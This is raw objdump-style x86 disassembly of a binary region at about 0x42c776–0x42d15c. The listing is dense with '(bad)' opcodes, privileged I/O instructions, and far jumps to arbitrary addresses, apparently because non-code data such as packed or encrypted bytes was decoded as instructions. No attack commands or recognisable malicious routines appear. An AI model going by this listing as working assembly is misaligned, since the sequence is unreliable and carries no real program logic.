  42c776:	into   
  42c777:	ja     0x42c782
  42c779:	or     BYTE PTR [edi+ebp*1-0x51],cl
  42c77d:	popf   
  42c77e:	adc    DWORD PTR [eax+0x6e],edx
  42c781:	jl     0x42c772
  42c783:	jg     0x42c7b1
  42c785:	sbb    eax,0x3fbb1a1a
  42c78a:	add    ah,cl
  42c78c:	adc    DWORD PTR [ebp-0x250dfc36],ecx
  42c792:	dec    ebp
  42c793:	inc    edi
  42c794:	push   ss
  42c795:	hlt    
  42c796:	mov    eax,0x276dcdde
  42c79b:	push   edi
  42c79c:	call   FWORD PTR [ebp+0x3a22eb8]
  42c7a2:	imul   BYTE PTR [edx]
  42c7a4:	add    dl,cl
  42c7a6:	aam    0xa4
  42c7a8:	test   al,bl
  42c7aa:	aas    
  42c7ab:	scas   eax,DWORD PTR es:[edi]
  42c7ac:	adc    ecx,esi
  42c7ae:	cmp    esi,DWORD PTR [edi-0x1fde202a]
  42c7b4:	pop    ebp
  42c7b5:	mov    dh,0x6b
  42c7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7b8:	jge    0x42c761
  42c7ba:	leave  
  42c7bb:	mov    al,ds:0x87a37494
  42c7c0:	bound  ebx,QWORD PTR [edx+0x49945465]
  42c7c6:	cli    
  42c7c7:	fmul   QWORD PTR [esi-0x6a]
  42c7ca:	idiv   dh
  42c7cc:	int    0xd8
  42c7ce:	int3   
  42c7cf:	call   0x8d5a7bdf
  42c7d4:	inc    edi
  42c7d5:	pop    ds
  42c7d6:	pop    ss
  42c7d7:	mov    ?,WORD PTR [esi+esi*4]
  42c7da:	jl     0x42c819
  42c7dc:	hlt    
  42c7dd:	cmc    
  42c7de:	int3   
  42c7df:	aaa    
  42c7e0:	sbb    ax,0x7245
  42c7e4:	add    al,0x8f
  42c7e6:	jno    0x42c810
  42c7e8:	push   eax
  42c7e9:	shr    DWORD PTR gs:[ecx+0xac],0x0
	...
  42c855:	add    BYTE PTR [eax],bh
  42c857:	mov    DWORD PTR [edx-0x6b],ebp
  42c85a:	sti    
  42c85b:	idiv   edi
  42c85d:	lods   eax,DWORD PTR ds:[esi]
  42c85e:	pop    ebp
  42c85f:	sbb    eax,0x6c91a40e
  42c864:	pop    edx
  42c865:	call   0x44a4cb
  42c86a:	inc    DWORD PTR [eax]
  42c86c:	add    BYTE PTR [eax],al
  42c86e:	enter  0xab22,0x1c
  42c872:	add    esi,esp
  42c874:	js     0x42c827
  42c876:	retf   0x7ddb
  42c879:	pop    ebp
  42c87a:	imul   eax,ebp,0x8af3347
  42c880:	jnp    0x42c825
  42c882:	mov    BYTE PTR [eax+ebp*4],dh
  42c885:	adc    eax,0x922c73ff
  42c88a:	sub    esp,esp
  42c88c:	mov    bh,0x55
  42c88e:	xchg   ecx,eax
  42c88f:	aas    
  42c890:	gs jmp 0x22dc:0x4d06d9c1
  42c898:	cmp    BYTE PTR [ebx+0x71],0x6d
  42c89c:	test   eax,0x22555cbc
  42c8a1:	daa    
  42c8a2:	aad    0x1b
  42c8a4:	cwde   
  42c8a5:	inc    eax
  42c8a6:	ja     0x42c907
  42c8a8:	in     al,dx
  42c8a9:	leave  
  42c8aa:	and    eax,0x9d12c989
  42c8af:	je     0x42c904
  42c8b1:	xchg   esp,eax
  42c8b2:	push   es
  42c8b3:	mov    ch,BYTE PTR [eax-0x33172a2e]
  42c8b9:	arpl   bx,bp
  42c8bb:	repnz clc 
  42c8bd:	sub    eax,0xaf97e502
  42c8c2:	repnz loope 0x42c8bd
  42c8c5:	and    ebx,DWORD PTR [ebp+edx*2-0x69447cb0]
  42c8cc:	mov    ecx,ecx
  42c8ce:	mov    cl,0x4b
  42c8d0:	dec    edx
  42c8d1:	dec    esi
  42c8d2:	or     DWORD PTR [edi+ecx*4+0x75],esi
  42c8d6:	lahf   
  42c8d7:	imul   edx,DWORD PTR ds:0xaea8e8b5,0xffffffa3
  42c8de:	outs   dx,BYTE PTR ds:[esi]
  42c8df:	fist   WORD PTR ds:0xba8ab4da
  42c8e5:	push   0xe3b8854b
  42c8ea:	ins    BYTE PTR es:[edi],dx
  42c8eb:	jae    0x42c8c4
  42c8ed:	lock std 
  42c8ef:	ror    BYTE PTR [ecx+0x77],0x9a
  42c8f3:	dec    ebx
  42c8f4:	xchg   DWORD PTR [ebp+0x5f2817c0],edx
  42c8fa:	daa    
  42c8fb:	ds sub al,0x95
  42c8fe:	push   ss
  42c8ff:	in     eax,0x9c
  42c901:	popa   
  42c902:	sbb    cl,BYTE PTR [edx-0x11]
  42c905:	push   ss
  42c906:	or     eax,esp
  42c908:	js     0x42c952
  42c90a:	fcomp  st(4)
  42c90c:	aaa    
  42c90d:	or     eax,0x1c46bd6d
  42c912:	pusha  
  42c913:	ret    0xf39b
  42c916:	pop    esp
  42c917:	and    ebp,ebx
  42c919:	cs std 
  42c91b:	cmp    al,0x39
  42c91d:	mov    eax,ds:0x662643fb
  42c922:	push   0x18
  42c924:	cmp    eax,0x866c82c5
  42c929:	lahf   
  42c92a:	mov    ds:0xc26f64f5,eax
  42c92f:	jecxz  0x42c92b
  42c931:	xor    esp,ecx
  42c933:	xchg   BYTE PTR [edx-0x39],ch
  42c936:	repz and edx,DWORD PTR [edx+0x64]
  42c93a:	lods   al,BYTE PTR ds:[esi]
  42c93b:	xchg   ebp,eax
  42c93c:	addr16 mov ecx,0x802eeb3b
  42c942:	dec    edi
  42c943:	jbe    0x42c99d
  42c945:	(bad)  
  42c946:	imul   esi,DWORD PTR [edx],0xffffffdd
  42c949:	xor    eax,0x6c16879b
  42c94e:	je     0x42c96c
  42c950:	cli    
  42c951:	call   0x8a9a:0xccfb95be
  42c958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c959:	push   ecx
  42c95a:	out    0x5,eax
  42c95c:	xor    eax,0x6ffc25cf
  42c961:	jae    0x42c8fb
  42c963:	cmp    BYTE PTR [edi+0x484ecf9d],bh
  42c969:	cmp    DWORD PTR [esi+0xfc39],eax
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0xa94a38f4
  42c9e6:	pusha  
  42c9e7:	fld    QWORD PTR [ecx]
  42c9e9:	add    bh,bh
  42c9eb:	add    BYTE PTR [eax],al
  42c9ed:	add    BYTE PTR [edx+0x78],bh
  42c9f0:	pop    ss
  42c9f1:	mov    al,ds:0xd67abd6a
  42c9f6:	jne    0x42ca26
  42c9f8:	and    eax,0x525a8742
  42c9fd:	xchg   esp,eax
  42c9fe:	pusha  
  42c9ff:	add    dl,bl
  42ca01:	jge    0x42ca22
  42ca03:	mov    ?,WORD PTR [eax+0xa]
  42ca06:	mov    eax,0x824ec2ba
  42ca0b:	pop    ebx
  42ca0c:	sbb    eax,0x79bf8a08
  42ca11:	xor    BYTE PTR ds:0x97722c9f,dh
  42ca17:	(bad)  
  42ca18:	sub    DWORD PTR [edx-0x37],ecx
  42ca1b:	clc    
  42ca1c:	sub    BYTE PTR [eax],bl
  42ca1e:	and    edi,DWORD PTR [edi+0x3d]
  42ca21:	xchg   ebp,esi
  42ca23:	sub    esi,eax
  42ca25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca26:	pop    edi
  42ca27:	push   esi
  42ca28:	cmp    DWORD PTR [ecx],esi
  42ca2a:	mov    bh,0x18
  42ca2c:	mov    ds:0x5209a841,eax
  42ca31:	iret   
  42ca32:	inc    ecx
  42ca33:	add    DWORD PTR [edi-0x326214cd],eax
  42ca39:	hlt    
  42ca3a:	jge    0x42c9d1
  42ca3c:	pushf  
  42ca3d:	jge    0x42ca2e
  42ca3f:	or     esi,DWORD PTR [edi]
  42ca41:	dec    ebx
  42ca42:	repnz out dx,al
  42ca44:	add    BYTE PTR [eax],ah
  42ca46:	push   es
  42ca47:	pop    edi
  42ca48:	cdq    
  42ca49:	adc    cl,BYTE PTR [eax-0x4952a600]
  42ca4f:	jg     0x42ca2a
  42ca51:	xchg   ebp,eax
  42ca52:	int3   
  42ca53:	inc    eax
  42ca54:	or     eax,0x38241d4e
  42ca59:	in     eax,dx
  42ca5a:	mov    ch,0x53
  42ca5c:	clc    
  42ca5d:	inc    ecx
  42ca5e:	jmp    0x42ca3b
  42ca60:	inc    ebx
  42ca61:	jo     0x42ca53
  42ca63:	mov    ecx,0x44a76331
  42ca68:	pop    DWORD PTR [ebx-0x41]
  42ca6b:	and    DWORD PTR [edx+0x5],ebp
  42ca6e:	aad    0xef
  42ca70:	xlat   BYTE PTR ds:[ebx]
  42ca71:	mov    ecx,0x20e3cdff
  42ca76:	nop
  42ca77:	or     edi,DWORD PTR [edx]
  42ca79:	lahf   
  42ca7a:	icebp  
  42ca7b:	psubb  mm0,QWORD PTR [ecx]
  42ca7e:	lods   al,BYTE PTR ds:[esi]
  42ca7f:	call   0x4d7dab1a
  42ca84:	or     bl,0xb4
  42ca87:	xchg   esp,eax
  42ca88:	pop    edx
  42ca89:	xchg   ebp,eax
  42ca8a:	and    bl,dl
  42ca8c:	lods   eax,DWORD PTR ds:[esi]
  42ca8d:	add    DWORD PTR [edi+edi*4],0x251dc21d
  42ca94:	retf   0x6930
  42ca97:	lea    edi,[ebp-0x45139bcd]
  42ca9d:	or     dh,BYTE PTR ds:0xbbb1f395
  42caa3:	ret    0x5e1e
  42caa6:	lds    edi,FWORD PTR [ecx]
  42caa8:	pop    ss
  42caa9:	push   0xd
  42caab:	clc    
  42caac:	xchg   ebx,eax
  42caad:	test   DWORD PTR [edi-0x16],esp
  42cab0:	push   edi
  42cab1:	pop    DWORD PTR [edx+0x3dbafba9]
  42cab7:	loop   0x42caad
  42cab9:	rol    ebx,cl
  42cabb:	jle    0x42cae8
  42cabd:	xor    DWORD PTR [edx+0x1dddd723],ecx
  42cac3:	std    
  42cac4:	cdq    
  42cac5:	and    ebp,DWORD PTR [ebx+esi*1-0x3c]
  42cac9:	mov    dl,0x43
  42cacb:	dec    edx
  42cacc:	cld    
  42cacd:	xchg   ebx,eax
  42cace:	cmp    BYTE PTR [ebx+0x3c],bh
  42cad1:	jae    0x42cac9
  42cad3:	push   edi
  42cad4:	cmp    dh,BYTE PTR [ebx]
  42cad6:	pop    esp
  42cad7:	leave  
  42cad8:	mov    bh,0xfc
  42cada:	popf   
  42cadb:	pusha  
  42cadc:	push   esi
  42cadd:	sub    eax,0x2fc7334a
  42cae2:	pop    ds
  42cae3:	mov    bh,BYTE PTR [esi-0x43573acb]
  42cae9:	pop    ss
  42caea:	inc    edi
  42caeb:	cmp    eax,DWORD PTR [ebp+0x0]
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x7cb6ec0]
  42cb64:	cmp    eax,0x1de5fe2
  42cb69:	add    bh,bh
  42cb6b:	add    BYTE PTR [eax],al
  42cb6d:	add    BYTE PTR [edx+0x1b2a2d37],ah
  42cb73:	cdq    
  42cb74:	ret    0x12fe
  42cb77:	daa    
  42cb78:	xor    al,0xe2
  42cb7a:	lahf   
  42cb7b:	sbb    DWORD PTR [ebp-0x14],0xffffffe5
  42cb7f:	imul   eax,DWORD PTR [ecx],0xffffffdc
  42cb82:	cwde   
  42cb83:	test   BYTE PTR [ebx+0x734d5982],al
  42cb89:	fisttp DWORD PTR [edi+ecx*1+0x7]
  42cb8d:	jmp    0x42cb32
  42cb8f:	stos   DWORD PTR es:[edi],eax
  42cb90:	xchg   ecx,eax
  42cb91:	stos   DWORD PTR es:[edi],eax
  42cb92:	retf   
  42cb93:	sbb    al,0x26
  42cb95:	add    BYTE PTR [edi+edx*8],bh
  42cb98:	or     eax,0x818dde1
  42cb9d:	sub    al,0xdc
  42cb9f:	and    ecx,ebp
  42cba1:	cmp    edx,DWORD PTR [ecx-0xe]
  42cba4:	xor    edi,ebx
  42cba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cba7:	dec    eax
  42cba8:	ss pop esp
  42cbaa:	mov    BYTE PTR [ebp+0x44],dl
  42cbad:	xlat   BYTE PTR ds:[ebx]
  42cbae:	dec    ecx
  42cbaf:	jne    0x42cbf1
  42cbb1:	pusha  
  42cbb2:	xchg   edi,eax
  42cbb3:	mov    dh,0x9
  42cbb5:	mov    al,0xe5
  42cbb7:	xor    DWORD PTR [ebp+0x26],ebp
  42cbba:	mov    dh,0xa1
  42cbbc:	xchg   BYTE PTR [edx+0x1fb3afae],dh
  42cbc2:	pop    es
  42cbc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbc4:	xor    ah,BYTE PTR [edi+0x1a]
  42cbc7:	loop   0x42cb5b
  42cbc9:	dec    edi
  42cbca:	arpl   ax,dx
  42cbcc:	jnp    0x42cba8
  42cbce:	adc    DWORD PTR [edx],0xea6e1c0b
  42cbd4:	jo     0x42cb6f
  42cbd6:	stos   BYTE PTR es:[edi],al
  42cbd7:	daa    
  42cbd8:	and    BYTE PTR [edi],ah
  42cbda:	fisub  WORD PTR [ecx+0x79907a28]
  42cbe0:	ret    
  42cbe1:	inc    esp
  42cbe2:	add    esi,ecx
  42cbe4:	je     0x42cbf3
  42cbe6:	loop   0x42cc65
  42cbe8:	nop
  42cbe9:	stos   DWORD PTR es:[edi],eax
  42cbea:	add    al,0x3e
  42cbec:	fadd   st,st(5)
  42cbee:	jl     0x42cbb4
  42cbf0:	sbb    DWORD PTR ds:0xee9f753b,edx
  42cbf6:	imul   ecx,ebx,0x68d217c3
  42cbfc:	lock adc al,0x76
  42cbff:	mov    ch,0x87
  42cc01:	inc    ebp
  42cc02:	gs mov ebp,0xa579b0e2
  42cc08:	mov    eax,ds:0xd4cda372
  42cc0d:	(bad)  
  42cc0e:	(bad)  
  42cc0f:	inc    eax
  42cc10:	sub    bh,dh
  42cc12:	js     0x42cbdf
  42cc14:	lods   eax,DWORD PTR ds:[esi]
  42cc15:	or     DWORD PTR [ebx+edi*4+0x4e],0xffffffca
  42cc1a:	and    esi,DWORD PTR [ebx]
  42cc1c:	call   0x4db8:0x8ea21123
  42cc23:	pop    ecx
  42cc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc25:	inc    eax
  42cc26:	and    eax,0x791710a0
  42cc2b:	(bad)  
  42cc2c:	lods   al,BYTE PTR ds:[esi]
  42cc2d:	mov    dl,BYTE PTR [ebx+eax*1]
  42cc30:	je     0x42cbd8
  42cc32:	inc    edx
  42cc33:	pop    esi
  42cc34:	xor    al,0x9d
  42cc36:	inc    edx
  42cc37:	pop    ebp
  42cc38:	inc    ebx
  42cc39:	(bad)  
  42cc3b:	retf   0x783c
  42cc3e:	lahf   
  42cc3f:	aam    0x44
  42cc41:	lds    ebx,FWORD PTR [esi+0x34]
  42cc44:	out    dx,eax
  42cc45:	ret    0xf094
  42cc48:	jne    0x42cc63
  42cc4a:	pusha  
  42cc4b:	xchg   DWORD PTR [edi+0x6f337fb6],edx
  42cc51:	outs   dx,BYTE PTR ds:[esi]
  42cc52:	(bad)  
  42cc53:	loop   0x42cc00
  42cc55:	ds aad 0xd0
  42cc58:	adc    eax,0x81644301
  42cc5d:	clc    
  42cc5e:	idiv   edx
  42cc60:	outs   dx,BYTE PTR ds:[esi]
  42cc61:	shr    DWORD PTR [esi],1
  42cc63:	mov    esp,0x8bf75565
  42cc68:	in     al,0x98
  42cc6a:	cmp    eax,esi
  42cc6c:	cmp    eax,DWORD PTR [eax]
	...
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x4f975fd1
  42cce6:	pop    esi
  42cce7:	fild   WORD PTR [ecx]
  42cce9:	add    bh,bh
  42cceb:	add    BYTE PTR [eax],al
  42cced:	add    BYTE PTR [edx],al
  42ccef:	cs jmp 0x42ccd6
  42ccf2:	pop    ds
  42ccf3:	rcl    DWORD PTR [ecx-0x76],cl
  42ccf6:	cld    
  42ccf7:	xchg   ecx,eax
  42ccf8:	pop    ds
  42ccf9:	cld    
  42ccfa:	push   es
  42ccfb:	add    ah,bh
  42ccfd:	jbe    0x42ccac
  42ccff:	jmp    0x42cd55
  42cd01:	add    al,0x3d
  42cd03:	(bad)  
  42cd04:	cdq    
  42cd05:	stos   DWORD PTR es:[edi],eax
  42cd06:	sbb    BYTE PTR [ebp+edx*1+0x60768f94],dh
  42cd0d:	aad    0xf0
  42cd0f:	ret    
  42cd10:	(bad)  
  42cd11:	sub    eax,0x38312e87
  42cd16:	jb     0x42cd18
  42cd18:	or     edi,esi
  42cd1a:	(bad)  
  42cd1b:	in     eax,0x32
  42cd1d:	out    0xe3,eax
  42cd1f:	cdq    
  42cd20:	jnp    0x42cd7b
  42cd22:	nop
  42cd23:	mov    al,0x24
  42cd25:	aaa    
  42cd26:	in     eax,0xe
  42cd28:	cmp    DWORD PTR [ecx+0x13a6d61b],esp
  42cd2e:	mov    ebx,0x7ac414a4
  42cd33:	jo     0x42cd02
  42cd35:	(bad)  
  42cd36:	mov    bh,0xb4
  42cd38:	inc    ebx
  42cd39:	jp     0x42cccb
  42cd3b:	or     BYTE PTR [esp+edx*4],al
  42cd3e:	inc    ebp
  42cd3f:	fisttp QWORD PTR [ecx-0x14]
  42cd42:	scas   al,BYTE PTR es:[edi]
  42cd43:	push   edi
  42cd44:	(bad)  
  42cd45:	mov    ebx,0xfe6c9b02
  42cd4a:	mov    ds:0xe7a76077,eax
  42cd4f:	fild   WORD PTR [esi-0x7d]
  42cd52:	pop    ecx
  42cd53:	add    eax,0x144bc053
  42cd58:	(bad)  
  42cd59:	dec    ecx
  42cd5a:	(bad)  
  42cd5c:	fwait
  42cd5d:	fs xor eax,0xad975b1
  42cd63:	imul   ebx,DWORD PTR [edi-0x43b0a3d4],0x18
  42cd6a:	js     0x42cd8a
  42cd6c:	push   ebp
  42cd6d:	pop    esp
  42cd6e:	test   al,0x2b
  42cd70:	in     eax,0x4f
  42cd72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd73:	or     DWORD PTR [edi-0x20],ebp
  42cd76:	in     al,0xe8
  42cd78:	push   edi
  42cd79:	add    DWORD PTR [esi+0x4bd1f2ff],0x8e9ffe12
  42cd83:	cmp    BYTE PTR [ecx-0x2566914f],dh
  42cd89:	daa    
  42cd8a:	inc    BYTE PTR [edi+ebp*1+0x32f37890]
  42cd91:	dec    edx
  42cd92:	stos   BYTE PTR es:[edi],al
  42cd93:	scas   eax,DWORD PTR es:[edi]
  42cd94:	add    eax,DWORD PTR [edi+0x426c8e27]
  42cd9a:	retf   
  42cd9b:	xor    edx,DWORD PTR [ecx]
  42cd9d:	mov    ecx,DWORD PTR [ecx-0x2]
  42cda0:	(bad)  
  42cda1:	imul   edx,DWORD PTR [ebx],0xffffffcf
  42cda4:	outs   dx,DWORD PTR ds:[esi]
  42cda5:	mov    ebx,0x80fc0912
  42cdaa:	(bad)  
  42cdab:	rcr    DWORD PTR [ebp-0x50],1
  42cdae:	pop    esi
  42cdaf:	dec    esp
  42cdb0:	int3   
  42cdb1:	xor    BYTE PTR [edi-0x7f],dl
  42cdb4:	jl     0x42cd52
  42cdb6:	add    BYTE PTR [edi],ch
  42cdb8:	pop    edi
  42cdb9:	inc    esi
  42cdba:	push   ecx
  42cdbb:	test   DWORD PTR [ebx+0x5e6d5a38],0x938867f5
  42cdc5:	sar    BYTE PTR [esi-0x1a],cl
  42cdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cdc9:	dec    edi
  42cdca:	mov    ecx,0x1cc65732
  42cdcf:	or     DWORD PTR [eax-0x5b600bea],edx
  42cdd5:	sar    DWORD PTR [esi+0x2701a310],1
  42cddb:	mov    cl,0x8b
  42cddd:	test   al,0x3
  42cddf:	fcomip st,st(5)
  42cde1:	lods   eax,DWORD PTR ds:[esi]
  42cde2:	test   BYTE PTR [ecx-0xb],ah
  42cde5:	out    0x2f,al
  42cde7:	jbe    0x42cdd1
  42cde9:	mov    ds:0x42a2d0,al
	...
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x6c
  42ce63:	xchg   edx,eax
  42ce64:	jle    0x42ce98
  42ce66:	pop    ebp
  42ce67:	loopne 0x42ce6a
  42ce69:	add    bh,bh
  42ce6b:	add    BYTE PTR [eax],al
  42ce6d:	add    BYTE PTR [ebp*8+0x5f3a6c01],ah
  42ce74:	inc    ebx
  42ce75:	jns    0x42ce4b
  42ce77:	sub    al,0x40
  42ce79:	fwait
  42ce7a:	push   gs
  42ce7c:	popf   
  42ce7d:	cmp    eax,0xb068640c
  42ce82:	jae    0x42cecc
  42ce84:	test   BYTE PTR [edi-0x50],bh
  42ce87:	inc    ebx
  42ce88:	sub    ecx,ebp
  42ce8a:	sbb    al,0xe0
  42ce8c:	call   0x52de:0x878d2526
  42ce93:	ds push ebx
  42ce95:	pop    ebx
  42ce96:	xchg   esi,eax
  42ce97:	cmp    DWORD PTR [esi],esp
  42ce99:	adc    BYTE PTR [ebp+0x25],0x74
  42ce9d:	inc    ecx
  42ce9e:	repnz sbb edx,DWORD PTR [ebp+ebp*1-0x2e]
  42cea3:	xchg   edx,eax
  42cea4:	xchg   BYTE PTR [ecx],ch
  42cea6:	inc    edx
  42cea7:	jle    0x42ce6a
  42cea9:	jnp    0x42ce71
  42ceab:	(bad)  
  42ceac:	and    eax,esi
  42ceae:	jp     0x42ceb1
  42ceb0:	mov    dh,BYTE PTR [eax]
  42ceb2:	adc    ebp,esi
  42ceb4:	call   0x25ec:0x192e5196
  42cebb:	mov    esp,0x38def0ac
  42cec0:	aam    0xa0
  42cec2:	scas   eax,DWORD PTR es:[edi]
  42cec3:	mov    edx,0x25d468d3
  42cec8:	ret    
  42cec9:	std    
  42ceca:	cmp    al,0x67
  42cecc:	add    dh,BYTE PTR [eax]
  42cece:	and    ebx,DWORD PTR [eax-0xe]
  42ced1:	jns    0x42cf1e
  42ced3:	lods   eax,DWORD PTR ds:[esi]
  42ced4:	xlat   BYTE PTR ds:[ebx]
  42ced5:	sbb    al,cl
  42ced7:	jno    0x42cf34
  42ced9:	sahf   
  42ceda:	sub    eax,0x8da629dc
  42cedf:	push   esi
  42cee0:	scas   eax,DWORD PTR es:[edi]
  42cee1:	lods   al,BYTE PTR ds:[esi]
  42cee2:	and    al,0x8a
  42cee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cee5:	push   ecx
  42cee6:	out    0xc8,al
  42cee8:	das    
  42cee9:	mov    BYTE PTR [ecx],al
  42ceeb:	xchg   ebx,eax
  42ceec:	xchg   DWORD PTR [edx-0x11],esi
  42ceef:	lock mov ebp,gs
  42cef2:	lds    ax,DWORD PTR [ebx]
  42cef5:	mov    WORD PTR [ebp-0x20],ss
  42cef8:	ins    DWORD PTR es:[edi],dx
  42cef9:	in     eax,dx
  42cefa:	icebp  
  42cefb:	test   eax,0x94759653
  42cf00:	rcr    BYTE PTR [edi+eiz*1],cl
  42cf03:	ss das 
  42cf05:	aad    0x66
  42cf07:	jns    0x42ce8d
  42cf09:	psubusb mm0,QWORD PTR [edx]
  42cf0c:	fwait
  42cf0d:	(bad)  
  42cf0e:	fcomp  QWORD PTR [edx+0x58]
  42cf11:	mov    ecx,0x1c3fd984
  42cf16:	dec    edi
  42cf17:	pop    eax
  42cf18:	dec    esi
  42cf19:	jno    0x42cf73
  42cf1b:	xchg   ebx,ebx
  42cf1d:	cld    
  42cf1e:	sbb    cl,BYTE PTR [esi-0x7e0730bc]
  42cf24:	test   BYTE PTR [ecx],al
  42cf26:	jg     0x42cf0b
  42cf28:	fimul  DWORD PTR [esi+0x37]
  42cf2b:	xchg   cl,ch
  42cf2d:	repz push eax
  42cf2f:	scas   eax,DWORD PTR es:[edi]
  42cf30:	ja     0x42ceef
  42cf32:	pushf  
  42cf33:	inc    ebp
  42cf34:	fstp   TBYTE PTR [eax]
  42cf36:	add    edi,DWORD PTR [ebx+0x7e9b25df]
  42cf3c:	ret    0xe883
  42cf3f:	loopne 0x42cf21
  42cf41:	push   ecx
  42cf42:	or     dl,ch
  42cf44:	stc    
  42cf45:	stos   DWORD PTR es:[edi],eax
  42cf46:	sub    eax,0x6261d7b3
  42cf4b:	mov    eax,ds:0x74296056
  42cf50:	adc    BYTE PTR [edx],ch
  42cf52:	(bad)  
  42cf53:	mov    ebx,0x3e1d5002
  42cf58:	jle    0x42cf1f
  42cf5a:	adc    BYTE PTR [esi+ebp*4-0x8],dl
  42cf5e:	jmp    0x46a0:0xb7576cf
  42cf65:	push   0x12
  42cf67:	jb     0x42cf20
  42cf69:	mov    cl,0xb2
  42cf6b:	cmp    BYTE PTR [ecx],bh
	...
  42cfd5:	add    BYTE PTR [ebx+0x3d],dh
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    ebx,FWORD PTR [edi]
  42cfe3:	wbinvd 
  42cfe5:	or     al,0x5c
  42cfe7:	loope  0x42cfea
  42cfe9:	add    bh,bh
  42cfeb:	add    BYTE PTR [eax],al
  42cfed:	add    ch,al
  42cfef:	shl    BYTE PTR [eax+0x79],cl
  42cff2:	fst    DWORD PTR [ecx-0x75]
  42cff5:	pushf  
  42cff6:	mov    ds:0x8f938e23,eax
  42cffb:	sub    dl,BYTE PTR [eax*4-0x4ece5bc4]
  42d002:	mov    eax,0x768e2c66
  42d007:	xchg   esp,eax
  42d008:	btc    DWORD PTR [ebx-0x61ef4dcf],ecx
  42d00f:	or     ah,BYTE PTR [ebx-0x32cb91b9]
  42d015:	adc    DWORD PTR [edi],ebx
  42d017:	mov    ds:0xfa45f31f,eax
  42d01c:	sub    ch,ch
  42d01e:	es mov edx,ebp
  42d021:	pop    ss
  42d022:	add    BYTE PTR [ebx+eax*2],cl
  42d025:	das    
  42d026:	push   esp
  42d027:	std    
  42d028:	add    ebp,DWORD PTR [ecx+0x5ff7c1d4]
  42d02e:	jp     0x42d049
  42d030:	mov    ds:0x5bb6c1ee,eax
  42d035:	(bad)  
  42d036:	(bad)  
  42d037:	xor    eax,0x9e113e05
  42d03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d03d:	les    esp,FWORD PTR [ecx]
  42d03f:	pusha  
  42d040:	sub    ah,BYTE PTR [ebx]
  42d042:	cmc    
  42d043:	dec    edi
  42d044:	fist   WORD PTR [esi-0x399aaee4]
  42d04a:	cmc    
  42d04b:	iret   
  42d04c:	jne    0x42d0af
  42d04e:	mov    ecx,0x30dcd2e2
  42d053:	mov    ds:0xd58ff70e,eax
  42d058:	clc    
  42d059:	call   0xf3c136df
  42d05e:	lock cmp al,BYTE PTR [edi+0x14]
  42d062:	jl     0x42d052
  42d064:	out    0x13,al
  42d066:	outs   dx,DWORD PTR ds:[esi]
  42d067:	jns    0x42d019
  42d069:	sub    BYTE PTR [edx-0xd],al
  42d06c:	jmp    0x18f0:0xdccaed85
  42d073:	sbb    edx,DWORD PTR [edi]
  42d075:	(bad)  
  42d076:	pop    esi
  42d077:	pop    edi
  42d078:	and    eax,0xcc3b71b5
  42d07d:	xor    DWORD PTR [ebx+0x12aa01ad],edi
  42d083:	adc    al,ch
  42d085:	fwait
  42d086:	stc    
  42d087:	push   ebp
  42d088:	scas   al,BYTE PTR es:[edi]
  42d089:	mov    cl,0x32
  42d08b:	sbb    eax,0xbb1c7e71
  42d090:	outs   dx,BYTE PTR ds:[esi]
  42d091:	jb     0x42d089
  42d093:	mov    esi,0x470a2bc8
  42d098:	push   esi
  42d099:	pop    ss
  42d09a:	leave  
  42d09b:	(bad)  
  42d09d:	lock or al,0xf5
  42d0a0:	outs   dx,DWORD PTR ds:[esi]
  42d0a1:	enter  0xe3a5,0x30
  42d0a5:	mov    esi,0x34f899b8
  42d0aa:	sbb    BYTE PTR [eax+0x29],dl
  42d0ad:	repnz adc eax,DWORD PTR [ebx+0x59]
  42d0b1:	inc    ecx
  42d0b2:	imul   eax,DWORD PTR [edi],0x786f819d
  42d0b8:	or     BYTE PTR [edi],bh
  42d0ba:	jge    0x42d09c
  42d0bc:	jno    0x42d040
  42d0be:	or     esi,DWORD PTR [esi+esi*8]
  42d0c1:	cmc    
  42d0c2:	inc    esp
  42d0c3:	popf   
  42d0c4:	sub    dl,BYTE PTR [eax-0x282ea288]
  42d0ca:	adc    DWORD PTR [esi+0x5a],ebx
  42d0cd:	push   esi
  42d0ce:	int    0x23
  42d0d0:	mov    al,0xd1
  42d0d2:	pop    eax
  42d0d3:	mov    dh,0x8d
  42d0d5:	mov    cl,0x6a
  42d0d7:	xor    esp,ecx
  42d0d9:	jo     0x42d0a1
  42d0db:	add    DWORD PTR [ebx],0x8bcd460c
  42d0e1:	xchg   ebp,eax
  42d0e2:	cmp    BYTE PTR ds:0x839caff3,0x45
  42d0e9:	outs   dx,BYTE PTR ds:[esi]
  42d0ea:	jae    0x42d14f
  42d0ec:	mov    BYTE PTR [eax],0x0
	...
  42d153:	add    BYTE PTR [eax],al
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
